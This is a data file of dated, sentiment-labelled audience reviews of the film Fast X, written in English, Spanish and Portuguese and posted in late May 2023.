"May 26, 2023",POSITIVE,This movie was amazing from beginning to end !! Cant wait for the next one
"May 26, 2023",NEUTRAL,"It felt like the dialogue wasn't natural, nobody edited the film, way too many characters to ever feel any ounce of emotion, and the sound was incredibly loud.  But it was a massive action film."
"May 26, 2023",NEGATIVE,"Tons of action, but felt more like filler than story. Entertaining enough but the action feels favored over the story."
"May 26, 2023",POSITIVE,Best comedy flick out rn
"May 26, 2023",POSITIVE,I have not followed the series but this is a great movie thanks to Momoa.
"May 26, 2023",POSITIVE,"Lots of action, but leaves no end"
"May 26, 2023",NEGATIVE,"For a movie they where supposed to honor Brian was a total shit movie, the movie is supposed to be about racing now its jus stupid fighting"
"May 26, 2023",POSITIVE,"The comparisons I've been seeing to Infinity War, it might sound ridiculous but I get it. As a hardcore Fast and Furious fan who has seen its ups and downs, especially downs in the past feels years. I can confidently say that Fast X has learnt from its past mistakes and that's what I personally think because I know there will be people that don't agree or will just hate on the franchise aimlessly. 

Let's get into the first problem that it fixes and I'll try my best not to spoil anything. One issue I've had with some of the recent F&F that I don't like is that they fail to balance the Family storyline along with the actual storyline which then leads to the film just being an action spectacle and that's all. I honestly think that issue derives from separating the family storyline for the movie's main arc instead of just having the two as one. This film like Furious 7 and Fast Five blends both storyline into one which is why it does so well. They're building off of each other to progress the storyline. It generally felt grounded at moments and I was able to take Dom and these characters seriously, I was able to stay engaged with the story because of this.  The film also ends on an insane cliffhanger and I could be saying this out of pure excitement for what I just watched but it was probably one of the best cliffhangers I've seen. It just played out so well. 

There's partially going to be a plot point spoiler here so you can skip this paragraph if you don't want to know. 
The second problem that Fast X fixes that I had specifically with F9 is there's another betrayal scene. With F9 the betrayal just felt pointless and I didn't care about the characters it was having with, it actually made me hate the film more. In Fast X, it's just done so well and it's one you can't see coming. The film was going to get a lower score because there was an inconsistency that kept making me question why this was a choice but the betrayal scene fixed that instantly. This is also why you don't make judgements until you've fully watched the film. 

The action in this film, over the top, the best in the franchise, just a mind blowing spectacle. They knew this was the start of a finale and they really wanted to make sure people were aware of that and bring out all the stops. One thing I've never said in any of my other F&F reviews is that the camerawork in this was really good, for F&F standards of course. It felt like I was watching something different and they were actually trying instead of doing what they've been doing for 12 years. 

The soundtrack was also really good and reminded me a lot of Fast 8's soundtrack which was just amazing. It's one that I'm 100% going to have to listen to once I get home. We get an instrumental version of See You Again in the film during one scene and it's so impactful in the scene, almost made me cry when I heard it. 

Jason Momoa plays our villain in this film, the son of Reyes from Fast Five. Dante Reyes is one the most menacing sociopathic and energetic villains that this franchise has seen. If I was to have a top 100 villains list, he would honestly make it. The comparisons to Joker are literally uncanny. He's just a straight up lunatic, from that Rome bomb chase scene, you just know what you're getting into with this character. 

Honestly amazing performances from everyone, they all stood out in their scenes, especially Michelle Rodriguez and Charlize Theron, absolutely loved their scenes together and apart. Aside from Jason Momoa, there are 3 new additions to the cast. We have Brie Larson playing Tess, the daughter of Mr. Nobody. She was probably my fav character in the film, Brie played her so well, enjoyed every scene with her, loved her fashion sense and especially her shoes. I do wish we got more screen time with her but there are 2 more films to come. The second newcomer is Daniela Melchior as Isabel. We also got little time with her but for that short amount, you're able to connect with her in the story emotionally and care for her, I won't reveal too much on her now. The final Newcomer is Alan Ritchson as Aimes, the new leader of the Agency. His character has this mysteriousness to him, I think the one thing I wish more from his character was more action scenes as there were only a few. His performance was also really good though and makes me want to check out Reacher. 

Something I normally despise in the F&F films are the retcons they love to do, this film contains another one and I won't spoil in what capacity. This is one retcon that I can get by though because it's one that I've believed to be the case since the event took place in the franchise. So this time around, I'm not mad with it. It all just depends on how they explain it. 

This film has generally made me happy. Fixing issues I've previously had, having a good story, an amazing villain who I'll get into and just one of the best endings I've seen in a while. There are moments I want to talk about that made me scream internally that I just can't because they're spoilers but they were so reminiscent of the original F&F films, Fast and Furious is finally back. If you're not a fan of the Fast and Furious franchise or tapped out then this isn't for you and you won't like it, if you're a fan just like me or enjoy the insanity of these films then this one is for you. Fast X can feel disjointed at times and it does have bad car CGI during certain moments. From a filmmaking standpoint it's also just messy but if you step into the world of Fast and Furious and just feel the vibe of it then it's an amazing film and the best since Furious 7."
"May 26, 2023",POSITIVE,Great movie cant wait to go watch the next movie !
"May 26, 2023",POSITIVE,Movie was fun and enjoyable. Loved it
"May 26, 2023",POSITIVE,Love these movies don’t care how unrealistic it is lol
"May 26, 2023",POSITIVE,"Se vuelve absurda al poco rato de empezar muy alejada de lo que fue la franquicia al inicio pero si con muchos elementos casi tipo marvel y transformes que ya son tan característicos desde hace unas 3-4 películas para acá ,palomera y amena logra su cometido de entretener"
"May 26, 2023",NEGATIVE,Fue una película más de lo mismo 👎🏽
"May 26, 2023",POSITIVE,"Loved Loved Loved the Movie. Sad that some of the Characters died.  Assuming from the White Light Dom and his son died. Doms Brother also died. Two new characters were introduced and one resurrected. 

All of the Characters are amazing actors but Vin Diesel and Paul Walker and Michelle Rodrigues made the franchise."
"May 26, 2023",NEUTRAL,I like the movie but there are extremely ridiculous scenes that could only happen in fast and furious. Excellent cast. But this movie doesn't quite convince me. 6/10
"May 26, 2023",NEGATIVE,"I was the absolute worst movie I have ever seen, it was so unrealistic as well as super cringy, this franchise has turned from what it used to be witch was about cars racing as well as seeing the cool cars. Now it's just a mission impossible rip of that had barely any cars in it. The one racing scene in the movie turned into action like what's the point any more. The action was ok, but just so unrealistic, they will elbow a bad guy with armor on their face and they would get knock out like why have the dang armor in the first place. The main villain was kinda goofy as well as a lot of unnecessary scenes. If you enjoyed this movie you are insane and need to go watch the first 7 then stop because they are terrible from there, All and all DO NOT WASTE YOUR TIME OR MONEY IT IS NOT FAST AND FURIOUS!!!"
"May 26, 2023",POSITIVE,"Amazing, Jason was good but why tf did he need to be a fruit cake? He's a certified bad ass and could have had a epic throw down with Dom"
"May 26, 2023",POSITIVE,everything was perfect.
"May 26, 2023",POSITIVE,"Gostei muito, a atuação do ""Jason Momoa"" como o vilão da nova trama é muito impactante de uma forma muito positiva, é de tirar o chapéu, (Ele entrega um vilão bem Coringa, com ar pesado e sarcástico ao mesmo tempo), é um ótimo filme da franquia, mesmo tendo muita cenas impossíveis de acontecer, é uma baita de uma obra de arte. (Aguardando o próximo capítulo dessa nova trilogia)."
"May 26, 2023",POSITIVE,Tons of fun! Fantastic stunts.
"May 26, 2023",POSITIVE,"I hate it left us on a cliffhanger, but the video was great!!"
"May 26, 2023",POSITIVE,"Should be seen on the largest, noisiest screen possible. Statham isn't pulling any punches. I thought bug-eyed Brie didn't want to make movies guys would like. -1 star for putting her in anything. She even brings her man-hating shoes to the party. Jason Mamoa is not a good Joker villain. That's for smaller, conflicted guys. Don't make him a rich, high-kicking fruitcake that operates remotely, when he ought to be throwing down in melee."
"May 26, 2023",POSITIVE,Loved action packed throughout + bringing all characters from the franchise together. Disliked how unrealistic a lot of the action was.
"May 26, 2023",POSITIVE,"La película estuvo genial, la recomiendo"
"May 26, 2023",NEGATIVE,This movie was butt. Vin Diesel has to be the cheesiest actor I've ever witnessed. Does this man even own sleeves?
"May 26, 2023",POSITIVE,"Jason Momoa stole the whole show. This film would be boring without him. He deserved for the villan of the year award. Very good special effects, explosions just blow from the screen. This film should be seen only in cinemas. Some viewers were very angry at the sudden end of the film. Summing up it isn't an outstanding piece od art, but as a entertainment for an evening it works."
"May 26, 2023",NEGATIVE,"This series has become a caricature of itself, and this one is so cartoonish, I was genuinely angry I wasted over 2 hrs and 50 (food and beverage) on it. Not remotely entertaining. Avoid."
"May 26, 2023",NEGATIVE,"After the passed couple of films in the installment the director and writers have a good overall theme, however I hurts to watch how fake the movies have gotten over time.
I enjoyed watching the movies with not as many fake scenes. Sure we can be creative, but let us not go too far."
"May 26, 2023",POSITIVE,"This movie is Great! I love the action and story although it's not perfect but it's still great 👍. I don't know why some people are bashing it, for f**king sake these are fictional characters, the fact that it's real people acting in it doesn't mean everything has to be real 🤦 the whole point is to be entertained. The internet these days is full of irritating critics that have nothing to offer than to spoil other peoples work of art."
"May 26, 2023",NEUTRAL,"Rompe las leyes de la física, agujeros de guión pero tiene un excelente villano les recomiendo para pasar un buen rato"
"May 26, 2023",POSITIVE,Sinceramente deja con ganas de más
"May 26, 2023",NEGATIVE,"Jason Mamoa was great, but these movies are getting soo ridiculously stupid it feels like it’s a parody of itself at this point and yet the movie still tries to take itself seriously. I get that it’s supposed to be stupid and ridiculous but these films are getting beyond stupid."
"May 26, 2023",POSITIVE,I liked the storyline. I like how they left it open for the series to continue abs never confirmed if everyone died.
"May 26, 2023",POSITIVE,"I understand people's point, but you have to admit that they're fun to watch"
"May 26, 2023",NEUTRAL,Great special effects
"May 26, 2023",POSITIVE,"A fun movie, which when watching I noticed the affection of the director and the production with references to old movies, at the same time it will also entertain anyone who likes action movies without commitment."
"May 26, 2023",POSITIVE,The movie was very epic. A lot of action. Great storyline. I would rewatch it over & over!!!! It’s that good ! I rarely rewatch a movie unless it’s worth watching over & over again! That’s enough to say how good it is!
"May 26, 2023",NEGATIVE,We all know what this movie is - I believe those that made the film do too hence this outcome...
"May 26, 2023",POSITIVE,"Unashamably fun with no sh*ts given nor taken! It's not a masterpiece, but it is fun."
"May 26, 2023",NEUTRAL,"if you enjoy the Fast & Furious franchise then you will enjoy this, has a couple laughs and a few surprise character returns. not a fan of post/mid credit scenes but this movie has a mid credit scene that is a must see. Sucks that its a multiple part movie because the movie as a whole was good, just a long wait for the next part."
"May 26, 2023",POSITIVE,Amazing movie to watch and great add on to legacy series.  Great movie to watch
"May 26, 2023",POSITIVE,solid ❤️ cant wait for more ❤️
"May 26, 2023",POSITIVE,Beat one yet and the ending is incredible
"May 26, 2023",POSITIVE,Love it! Totally recommend it!
"May 26, 2023",POSITIVE,"Lots of unrealistic CGI which was expected. the 2 hrs, 21 minutes went by fast. Enjoyed the movie, just not the ending which seemed abrupt, waiting for Furious 11 now."
"May 26, 2023",POSITIVE,Buenísima la película!
"May 26, 2023",NEUTRAL,Fast and Furious - another episode. 
"May 25, 2023",NEUTRAL,"Call it what it is fast & Furious 10, 11,,12  part #1 of 2 which you have to go back to see part 2 bc part one has no ending. .the director of this movie is being sleek naming different then fast & furious bc it’s getting ridiculous to call it fast & furious 11 & 12."
"May 25, 2023",NEGATIVE,"Dont waste your time even if you are a fan of this series. Road Runner cartoons make more sense. The plots fore these movies get more ludicrous with each installment. The principal performers should stick to grunts and groans and the writers should know by now to exclude sentimental scenes. All that ""family is everything"" don't belong here. Puke. Puke. However,  there are many great action sequences, unbelievable as they are. Nothing makes sense. Everyone involved take themselves too serious and seem convinced they are doing ""MISSION IMPOSSIBLE."""
"May 25, 2023",POSITIVE,The movie was very good and very emotional.I loved it!.
"May 25, 2023",NEUTRAL,Not much of a story but lots of unbelievable action. 
"May 25, 2023",NEUTRAL,Just enjoy the action of the movie.
"May 25, 2023",NEUTRAL,Messy. Unrealistic. Return of the dead. No ending
"May 25, 2023",POSITIVE,Jason mamoa stole the show
"May 25, 2023",NEUTRAL,"La décima entrega, sigo está saga desde niño, es inevitable ver una nueva entrega para ver qué se intentan ahora, está entrega queda como un capítulo de una serie, creo que es hora de controlar un poco el exceso para no llegar a lo ridículo, quedan 2 entregas más, o eso se dijo...haber que pasa."
"May 25, 2023",NEUTRAL,"me gusto mucho el villano, aunque siento que le faltó un poco mas de accion, estilo F&F, si tiene accion, pero donde quedaron esas escenas fantasiosas como un auto en el espacio, en general es una buena película pero me quedo a deber frente a entregas pasadas."
"May 25, 2023",POSITIVE,Damn damn damn what an amazing movie. Family friendly
"May 25, 2023",NEGATIVE,"There are just no rules to this movie or, frankly, any other Fast and Furious movie. People who should be dead don't ever die, people who have most certainly died somehow are still alive, the characters just make stupid decisions left and right, the lines are dull, and somehow the heroes never take a scratch. There's no gravity to anything in the movie, especially since no one ever, ever, ever dies. (Except for Paul Walker, rest in peace. But hey, anything goes with the Fast and Furious!)"
"May 25, 2023",POSITIVE,No matter how you live your life you will never guess how fast I’m going in a quarter mile.
"May 25, 2023",POSITIVE,Me encantó como siempre se pasan las leyes de la física jajaja
"May 25, 2023",NEUTRAL,"Cómo siempre los efectos especiales altamente exagerados , pero en general la trama está muy bien hecha, el guión está francamente bueno, tampoco no es que sea la gran cosa."
"May 25, 2023",POSITIVE,Very enjoyable yes I it can get dumb and nonsensical at times but overall very entertaining.
"May 25, 2023",POSITIVE,Perfect popcorn movie Delivers!
"May 25, 2023",POSITIVE,"Action from the start to end, a must see movie this year!"
"May 25, 2023",POSITIVE,Didn't like the ending.
"May 25, 2023",POSITIVE,Excelente película ya quiero que salga la segunda parte
"May 25, 2023",POSITIVE,"He made 1 mistake, he didn't take Dom's car."
"May 25, 2023",POSITIVE,It was amazing and left allot of 'cliff-hangers'.
"May 25, 2023",NEGATIVE,This movie was absolute HOT Garbage! It kept jumping from different scene to scene no real story line. The action was unbelievable and the movie lost me completely when Dom picked up a car with one arm! Is he supposed to be a superhero? The franchise has fallen from grace and badly! I don't care the movie is to be continued its trash and should have never been made
"May 25, 2023",POSITIVE,"Great movie, big twist to it."
"May 25, 2023",POSITIVE,Great movie can’t wait to watch the next one
"May 25, 2023",NEGATIVE,"If you're a fan of the Fast and Furious franchise, you'll want to skip this one.  It may have ruined the rest of the films for me, retroactively.  You'll get an hour into the movie and wonder if it has even started yet, or what it's about.  As the old adage goes...if everything is a caper, nothing is a caper.  There are no fewer than 28239482 capers on this one, and none of them get off the ground. The reuse some old tricks, and make them seem like it's just work-a-day biz for the F&F crew.  This film also went full Star Wars.  That is...they dumped all the old tricks in surrounded by a bunch of cameos-by-friends.  I mean really...Davidson and Larson?  Stop it.  There were several scenes that were so poorly performed and I thought...""Oh, they'll reshoot that before the final print.""  Yoops.  This was especially true with Larson's scenes.  Dear Hollywood:  She's not good.  And don't even start on Jason Mamoa.  It's like someone said ""Be Joaquin's Joker, but add a little Pee-Wee Herman, and any 4 year old.""  The ""music conducting"" is embarrassing nonsense.  In the end, you get a depressing good-guys-never-win movie that won't end, and has one thousand cliffhangers.  If I watch any more of these, it'll be on Plex. Sad ending to a fun franchise."
"May 25, 2023",POSITIVE,"Non stop thrill ride in every way. Complete edge of your seat fun from the start. Best of the franchise so far. Must see, in the theater at least a couple of times!"
"May 25, 2023",NEUTRAL,Que?? Que??? Que??? Que?? Que??
"May 25, 2023",POSITIVE,I loved all of the action scenes but the movie seemed a little choppy.
"May 25, 2023",POSITIVE,Cliff hanger was beautiful the whole plot stemming all the way from fast and furious five up until now the storyline doesn't just jump. It makes sense and it's just a beautiful storyline overall can't wait to see the next part come out hopefully Vin and his son lives in please tell me Mr. scene is a life.
"May 25, 2023",NEUTRAL,Jason Mamoa rouba todo filme👍🏾
"May 25, 2023",NEUTRAL,"Acho que já passou do tempo de cair a ficha, velozes e furiosos infelizmente não são mais sobre carros, gostaria que na parte 2 explorassem mais um pouco dos carros em si, não das tecnologias exageradas. A Mia não faz nenhum sentido nesse filme mais, sem o Brian e o Hobbs não é o velozes e furiosos, conclusão; 58/100"
"May 25, 2023",POSITIVE,The action and emotion of this film really stands out from all the rest even though Paul Walker isn't there! Absolutely amazing and a definite must-see for all the die hard fast and furious fans out there for part one of a great ending to a delightful franchise. Can't believe they've gone this far to make it happen for almost 22 years since the original.
"May 25, 2023",POSITIVE,Amazing movie as always. Can't wait for part 2 and 3
"May 25, 2023",POSITIVE,Me & my grandson loved the whole movie. He was so excited. He picked the movie for the day. Loved it...
"May 25, 2023",NEGATIVE,This movie was soo bad I started getting anxiety because I couldn't wait for it to end.
"May 25, 2023",NEGATIVE,So far removed from the originals.  Improbable scenarios.  We were only ones in theater.  Stream later but wouldn't pay for in theater.
"May 25, 2023",POSITIVE,I cant wait for the next movie!!!
"May 25, 2023",POSITIVE,Fast paced high octane... Great cliffhanger...
"May 25, 2023",POSITIVE,I loved it can’t wait to the next one comes out
"May 25, 2023",NEGATIVE,One of the worst installments in the franchise. A laughable villain and more far fetched stunts.
"May 25, 2023",POSITIVE,"Pure over-the-top action, with a great set of actors. The movie itself is aware how ridiculous the plots are for these movies, so if you're expecting Shakespeare, then don't go watch it. This movie is made for people who just want a fun movie to watch and enjoy while breaking many rules in modern cinema. No socio-political agenda is shoved down the throat of viewers and just for that, it makes the movie so much better!"
"May 25, 2023",POSITIVE,Perfectly done from music to action to casting  don't ever let the fast Sega end  great movie
"May 25, 2023",NEGATIVE,Total Cliffhanger!!  I hate books like that and movies even more
"May 25, 2023",NEGATIVE,Still meh … but not as horrendously bad as F9
"May 25, 2023",POSITIVE,Loved it!! Lots of action and a great story line!!
"May 25, 2023",NEUTRAL,"Part of all the long franchise that actually is getting more absurd, but the action scenes, the  easter eggs from past movies, and Momoa  character  make an enjoyable title."
"May 25, 2023",POSITIVE,Good action movie but I miss racing movie same as Fast 1-3 and I think villain not cruel if compare with shaw family.
"May 25, 2023",NEGATIVE,The plot isn't even about the car scene anymore...Just action movies and outrageous scenes that took away why people fell in love with the first few movies in the series! It isn't about changing with the time or audience either. It should have stayed true to its roots!! Been milking it since Fast Five...
"May 25, 2023",POSITIVE,"If you are a fan of the franchise, you will not be disappointed. Action throughout and callbacks to earlier characters immerse you into the saga that has been building for years."
"May 25, 2023",NEGATIVE,The best movie for the mentally challenged out there. Vinny best actor with no acting chops at all. Script written by 10 year olds
"May 25, 2023",POSITIVE,This was the best one yet. Wow can't wait for the next one.
"May 25, 2023",NEUTRAL,Just what you expect from a fast and furious movie.... Way more entertaining than the new little mermaid.
"May 25, 2023",NEGATIVE,I should’ve trusted my gut after watching the trailer and saved my money. The writing on this film was just not even close to the level of a lot of the others. I found myself saying that sounds awkward or too cheesy multiple times throughout. The forced comedy did not hit. Seems a lot of shortcuts were taken from my view and the film suffered. And the ending…… really?
"May 25, 2023",POSITIVE,I liked it very much
"May 25, 2023",NEGATIVE,They have made too many of these. Same formula. Ridiculous car stunts. Time to retire franchise
"May 25, 2023",NEGATIVE,"It's hotter than summer!!! For a new audience it's a great summer time sizzling movie, as an audience I need this family so badly even after 2 years of fast 9. The movie is good , but the timeline of moving seems so tangled, it's a baffling movie for a new audience. Some action scenes feel so monotonous, as an audience i personally feel it doesn't stand at expectations of a fan who is watching this series straight from the 1st part. First half is so gripping, story is moving ahead showing some family love, buts second half is a worst nightmare for a faster and furious fan. Well it will be trilogy even after fast x, so expectations are still on the top fir a last ride🤝."
"May 25, 2023",NEGATIVE,They really need to stop. Its unfortunate i really like vin.
"May 25, 2023",NEGATIVE,"ONE OF WORST FILM OF ALL TIME!

WHAT A WASTE OF TIME, MONEY AND ENERGY."
"May 25, 2023",NEUTRAL,It's a shame. but fine
"May 25, 2023",NEGATIVE,"Una película que considero igual que una comida chatarra, la disfrutas de momento, pero luego te das cuenta del daño que te hace y te arrepientes de haberla comido."
"May 25, 2023",NEGATIVE,"How could a movie with that much action be THAT BORING? 

I feel this movie wrung the last bit out of the franchise for me. Great actors can't make up for bad writing."
"May 25, 2023",POSITIVE,"Seriously, not as bad as F9, or Fate. The plot of the story to build a trilogy I really loved, it was very simple but at the same time it was fun with Jason Momoa as Dante Reyes who is a very threatening joker like villain that is perfect for the rest of the trilogy. But of course some negatives too. Flying cars and flying humans but thankfully not as unrealistic as F9. Another negative is that the familia gets even more larger so that there's a lot of characters to juggle. Han is very underused considering he was resurrected in the last one. The familia gets sperated during the movie but at the end the cliffhanger seals the deal and I will watch the eleventh installment whenever it's coming out."
"May 25, 2023",POSITIVE,"Esta genial, y entretenidad, no apta para progres."
"May 25, 2023",NEGATIVE,"The movies are just getting worse and worse, Jason Momoa's role didn't feel right. the plot line was a complete mess, the movie was difficult to follow. The action scenes were okay. The ending was a bit weird and horrible."
"May 25, 2023",POSITIVE,"Wow, so.....After Fast X, will be Furious?"
"May 25, 2023",NEGATIVE,This so called movie is pure trash! Acting is a joke. Not sure how much money they paid Jason Mamoa to act like a fool but his character belongs in a different movie. This whole movie is a caricature of itself! I honestly wanted to leave 45 minutes into it. Go see anything besides this.
"May 25, 2023",NEGATIVE,Se me hace super aburrido que reviven más que en Dragón Ball. Osea super repetitivo y ya se sabe desde un momento que va a pasar
"May 25, 2023",POSITIVE,"Everybody loves a sure thing and there is nothing more guaranteed than a Fast and Furious movie that is full of action and adventure and that most defining quality, family. In what could be the first half of the final film, this was a great half.

It's been time since the events of the previous movie, but it is the events of the fifth film that come back to haunt Dominic Toretto and his family and friends. The son of the Brazilian mobster the family stole $100 million from has spent the past decade plotting revenge. Turning their previous foe into an afterthought as they realize this man is a stone-cold psychopath out to make them suffer before their eventual demise. Many familiar faces return alongside new faces with action from the United States, Italy, Brazil, England, and Portugal - with all the action and drama that makes these movies great.

This was a great start into what I can only imagine will be an epic finale, it's a shame the wait has to be so long. Vin Diesel is as great as ever as well as the rest of the family with Michelle Rodriguez, Tyrese Gibson, Ludacris, Nathalie Emmanuelle, Sung Kang, Jordana Brewster, John Cena, Charlize Theron, Helen Mirren, and Jason Statham back in action. But it's the new faces in Brie Larson, Daniela Melchior, Alan Hutchison, and the unbelievably ferocious Jason Momoa delivering the performance of a lifetime. This was a fun time in the cinema and it will be a long agonizing wait for the next film."
"May 25, 2023",NEGATIVE,"Worst movie I've ever seen. I know they preach ""FAMILY"" but sometimes a family needs to die. Momoa is over the top, Vin Diesel doesn't realize that is an action romp with his stoic expression that never changes, the rest of the cast are just cashing their paychecks at this point. The scenes are so wildly unrealistic that you can't even enjoy them.  I wish I could say more but I need to wash my eyes out of this filth."
"May 25, 2023",NEUTRAL,"The storyline remains ridiculous as usual, but it does manage to fulfill its purpose of providing entertainment."
"May 25, 2023",POSITIVE,"The movie is awesome and filled with jampacked action sequences. Also, the acting by Jason Momoa was so cool and benchmarking. Looking forward for more from the franchise."
"May 25, 2023",POSITIVE,Jason ruined the entire movie i wish he was never in the movies
"May 25, 2023",NEGATIVE,"Honestly was an all around stupid and horrible movie. Fast and Furious is done, they shouldn't make any more movies."
"May 25, 2023",POSITIVE,"Its very fast and entertaining movie. Jason's portrayal was so good. Must watch.
Not a fresh story but Entertaining."
"May 25, 2023",POSITIVE,Amazing!!! Cant wait for the next one.
"May 25, 2023",POSITIVE,"Crazy grate movie, 100% recommended for old fans. And a question for fast and furious directors… how far are you gonna take this? I loved it!!!"
"May 25, 2023",NEUTRAL,"Let me be clear, this movie was absolutely terrible. Probably the corniest film I seen in the past 3 years (cause I haven’t watched the last 2 or 3 Fast & Furious movies) but it was so damn corny and over the top that I constantly found myself looking over to my girl saying “BRUH” followed by exploding laughter. Probably top 5 comedies of the year if I’m being honest. I came in with very low expectations and they disappointed those so much, it was laughable. Which is what saved it lmao highly recommend watching this movie under the influence to enjoy it as much as we did. #FAMILY 🤣🤣"
"May 25, 2023",NEGATIVE,"Jason Momoas character ruined the entire thing. I understand certain parts of the movie are unrealistic and that can be frustrating, HOWEVER the biggest part of the movie is family, and the storyline has always been how important family is, and every villain the story has dealt with before momoa played their role perfect and took it serious, especially the part of putting does family in danger to get what they wanted, and they never played it as a joke. Putting momoa as a villain and then having him be who he was? Making jokes about it? His personality in the movie? Everything was ick. I'm sorry but literally they ruined the ENTIRE legacy with this one movie. I was so disappointed."
"May 25, 2023",POSITIVE,I laughed a lot and that was good. I could not take it serious and believable after a while. I did not connect but it was cool to watch.
"May 25, 2023",POSITIVE,"Amazing movie definitely recommend if you like cars, racing, and action. Need another movie!"
"May 25, 2023",NEGATIVE,"A nonsense movie with a trivial plot with a noticeable racial change, but with excellent action scenes that make for a good time."
"May 25, 2023",POSITIVE,Loved it!! Great job all around!! Beautiful movie!! Cant wait to see it again!!
"May 25, 2023",NEGATIVE,It was very overrated. Most of the stunts were nonbelieveable.
"May 25, 2023",POSITIVE,fast x was not bad ! 8.9/10
"May 25, 2023",POSITIVE,"Good action movie love the cast, ending was a bit odd"
"May 25, 2023",NEGATIVE,Fuking sucks worse than the last one
"May 25, 2023",NEGATIVE,"Umm. What the heck did I just watch? Momoa's part was unnecessary. They could've just stuck with 1 character. Love the action but very confused about what was going on? I want it to see Michelle and the crew trying to help Vin. Idk, for me, I didn't like it! And the movie was more like it was Jason Momoa's movie. I want it to see more FF."
"May 25, 2023",NEUTRAL,The movie was great the ending however horrible
"May 25, 2023",POSITIVE,FasTEN your seatbelt
"May 25, 2023",POSITIVE,"Crazy, silly fun. Jason Momoa steals the movie."
"May 25, 2023",POSITIVE,fast 10 was 💯 awesome my dad and I enjoy movie now look forward see fast 11 whenever come out 2024 hope???
"May 25, 2023",NEGATIVE,quite possibly the worst movie i’ve ever seen. it’s up there with Evil Dead Rises.
"May 25, 2023",POSITIVE,I loved the movie. It was amazing with so much unanticipated action!!
"May 25, 2023",NEGATIVE,Waster of money. Lots of implausible action scenes. They shouldve ended it with this movie. parts of it Were good others were stupid.
"May 25, 2023",NEUTRAL,Exelente para assistir...
"May 25, 2023",POSITIVE,"I loved the movie!!!  Bravisimo!  Can't wait to see it again at theater or at home.  It was very exciting!  I liked how they worked Paul Walker in at the beginning as tribute and then worked what happened when they stole the vault in the other Fast and Furious and mixed it in with the new part with Jason Momoa.  He was really great with all his nail polish.  Somebody must have had the same dream I had, the dead man's face.  I had dreamed everyone has a facial expression that people see after a person's death. It's not calm, etc."
"May 25, 2023",POSITIVE,It’s was awesome awesome movie fantastic movie
"May 25, 2023",POSITIVE,The movie was very good with a lot of action.
"May 25, 2023",NEGATIVE,"Laughable special effects that looked like it needed a lot more rendering to make it believable. Most of the acting was alright, but Jason Momoa was absolutely hideous in this movie. I went into this with expectations of being entertained, but was left disappointed."
"May 25, 2023",NEGATIVE,"This has got to be one of the dumbest movies I have ever watched. I went to the bathroom twice and didn't even care about what I may have missed. Jason Momoa as the bad guy makes the whole movie worth it and that's about it. He was actually brilliant. Nice to see him do something different. This flick is two and a half hours of ridiculous nonsense. Now all the other Fast movies are pretty implausible but not ridiculous like this one. They were good and enjoyable. But this one? Ridiculous, farcical, totally impossible stunts. And how the heck do they get their cars in all of these far out places? Even with all the money, it's not possible in the timeframe given.  Which just adds to the nonsense. Fast X has a great family/loyalty theme, which I appreciate. And some of the fight scenes are amazing (Theron and Rodriguez!). And I love all the actors. But all in all, it sucks. Especially, when at the end you find out it's actually not the last one. I'm all in for a good cliffhanger but sheesh, people. This really took it too far."
"May 25, 2023",POSITIVE,I Like It because its Super Awesome!!!
"May 25, 2023",POSITIVE,Amazing -action packed..all the cast was phenomenal but Jason Momoa was the star...he made the movie even higher
"May 25, 2023",POSITIVE,"So good, saw everybody that has ever been in Fast and Furious. Love"
"May 25, 2023",POSITIVE,"OMG!!!!!! What a fantastic movie. Han and LETTY are my favorite people. They don't disappoint. The car action driving is great. The blow up scenes are really super cool. And what can you say about the bad guy, Dante. Superb. It was so much fun watching all the characters come together and do what they do. The stunts were out of this world. Some of the best I have ever seen. This movie is a must-see, and stay for the extra part after some of the credits at the end. It will blow your mind!"
"May 25, 2023",POSITIVE,Jason Mamoa was epic. Cant wait for 11
"May 25, 2023",NEGATIVE,Next time I’ll pass on the LIVE ACTION CARTOON!!!
"May 25, 2023",NEGATIVE,"I have watched all the Fast and the Furious movies since I was a teenager and I love them for the most part but I feel that Every movie after the First one is getting worst and worst and worst and Finally This is the worst of all of them by far... I cannot believe how bad was it.. this is like a $100,000 budget movie. and the story is horrible this is like a cartoon made for kids between five and eight."
"May 25, 2023",POSITIVE,at this point we all know what to expect but this was a genuinely fun time!
"May 25, 2023",POSITIVE,Good movie with the special effects and characters. Awesome cliffhanger for the next one
"May 25, 2023",POSITIVE,"Loved how they brought back characters, story line, and special effects. Those that complain that cant happenget a life its a movie! Very action packed and entertaining."
"May 25, 2023",NEUTRAL,"It was  to all all over  the place the movie was going way to fast
It seems that All the characters were separated and not together as a team"
"May 25, 2023",NEUTRAL,It seems that the franchise has went a different route. It is not holding true to what it once was. It seems like the plot tried to take it back to the movies that were actually good. Unfortunately it fell short.
"May 25, 2023",POSITIVE,Omg omg action packed
"May 25, 2023",POSITIVE,Jason Momoa makes this movie totally worth watching. The way he plays his character is funny.
"May 25, 2023",NEGATIVE,"More of the same, apparently this saga wears out with each movie they release, I really hope this is the end, although you never know with this series of movies"
"May 25, 2023",NEUTRAL,"First, don't call this film Fast EKS. It's Fast 10 with 10 spelled as Roman numeral. (And yes, there are a bunch of puns in that title if you think on it.) Second, this film is clearly setting up an even bigger story -- hence the abrupt ending. Third, this film was wildly entertaining in the usual FF style, but a little too long. There were moments that could have been trimmed down to maintain momentum. The Family was front and center, and the action sequences were as absurd as ever, but at least there were no spacecars. Definitely recommend if you are a fan of the FF franchise. Jason Momoa was AWESOME -- may be his best role yet."
"May 25, 2023",NEGATIVE,Worst Fast movie ever. Thought the last one was bad but nope. This one is worse.
"May 25, 2023",NEUTRAL,Pretty good..lotta cliff hangers
"May 24, 2023",POSITIVE,"I loved the awesome excitement, drama and the great cliff hangers! The movie was great and it was a great way to continue the story and the series as it was and where its going. The cliffhangers are going to bring me and a lot of others to the next great level of the series!!"
"May 24, 2023",NEGATIVE,"Roteiro ruim , faz de tudo pro Torreto ficar vivo e seu filho tem uma péssima atuação."
"May 24, 2023",POSITIVE,Loved the non stop action and the hot cars and the hot guys
"May 24, 2023",POSITIVE,This movie was blast to watch. The thrill of it was amazing and seeing Dom and crew back together again was awesome. Jason Momoa as Dante was so much fun to watch and you can tell that Momoa had fun playing the role. I got anxiety while watching this. I a lot of fun watching this film. Can't wait for the final movie to see want happens next.
"May 24, 2023",POSITIVE,My I.Q. must be ramen noodles cause I enjoyed this one. Cameos were cool. Liked some of the CGI car scenes especially the one in Rome. I have not seen A Fast flick since the 1st two and was not disappointed.
"May 24, 2023",POSITIVE,"Great movie, waiting for the 11"
"May 24, 2023",NEGATIVE,"When will the fast and furious franchise realise that it's the end of the road?
It's doesn't matter the new character introduced, this franchise has run it's course!"
